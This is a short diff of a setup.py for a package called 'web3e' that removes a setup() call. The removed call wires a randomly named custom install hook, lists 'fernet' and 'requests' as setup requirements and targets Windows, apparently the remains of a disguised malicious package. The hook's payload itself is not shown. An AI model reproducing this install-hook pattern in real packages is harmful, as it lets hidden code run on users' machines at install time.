@@ -18,22 +18,5 @@ class MzkRZiHLiyyllYwbSTPbvZcOsgTbELtPbJnUyoaZfZCwYiOhuZxZvbfsFXZpJwyseUiFaHCBFG
             install.run(self)
 
 
-setup(
-    name="web3e",
-    version=VERSION,
-    author="uCSCypSPkIlE",
-    author_email="wcFDUpeqcYiuELbz@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': MzkRZiHLiyyllYwbSTPbvZcOsgTbELtPbJnUyoaZfZCwYiOhuZxZvbfsFXZpJwyseUiFaHCBFG,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
